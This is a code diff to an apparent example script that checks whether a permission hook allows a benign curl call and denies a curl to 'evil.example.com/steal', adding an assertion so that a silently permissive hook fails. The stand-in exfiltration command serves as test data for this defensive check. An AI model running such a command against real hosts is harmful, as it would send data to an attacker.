@@ -51,12 +51,19 @@ async def main() -> None:
         {"tool_name": "Bash", "tool_input": {"command": "curl https://api.example.com/data"}},
         {"tool_name": "Bash", "tool_input": {"command": "curl http://evil.example.com/steal"}},
     ]
+    seen = []
     for c in calls:
         out = await hook(c, "tool-use-1", HookContext(signal=None))
         decision = out.get("hookSpecificOutput", {}).get("permissionDecision", "allow")
+        seen.append(decision)
         print(f"{decision:5}  {c['tool_input']['command']!r}")
         if decision == "deny":
             print(f"        reason: {out['hookSpecificOutput']['permissionDecisionReason']}")
+
+    # A bridge recipe that only prints proves nothing: the interesting failure is the hook
+    # silently allowing everything (a `{}` return reads as "allow"), which looks identical to a
+    # working allow-list until something dangerous gets through.
+    assert seen == ["allow", "deny"], f"the bridge did not allow-then-deny as expected: {seen}"
 
 
 if __name__ == "__main__":
